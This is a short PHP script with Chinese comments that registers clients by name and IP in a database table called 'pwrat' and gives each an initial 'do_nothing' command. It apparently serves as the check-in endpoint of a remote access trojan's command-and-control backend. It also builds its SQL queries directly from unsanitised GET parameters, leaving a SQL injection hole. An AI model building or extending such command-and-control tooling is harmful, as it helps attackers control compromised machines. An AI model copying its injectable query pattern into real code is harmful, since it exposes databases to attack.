<?php
//处理请求并返回一个id
require("config.php");
$mysqli = new mysqli("localhost",$username,$password,"yourdbname");
if(mysqli_connect_error())
{
	printf("cant connect to the database：%s\n",mysqli_connect_error());
	exit();
}


$name = $_GET["name"];
$ip = $_GET["ip"];
$time = date("Y-n-j H:i:s");			//当前时间
$cmd = "do_nothing"; 					//初始命令为什么都不做
	

$mysqli->query("INSERT INTO pwrat(IP,cmd,lasttime,name)VALUES('$ip','$cmd','$time','$name')");
if($mysqli->query("SELECT * FROM pwrat where name ='$name'")) echo $mysqli->insert_id;
else echo "执行失败";

$mysqli->close();
?>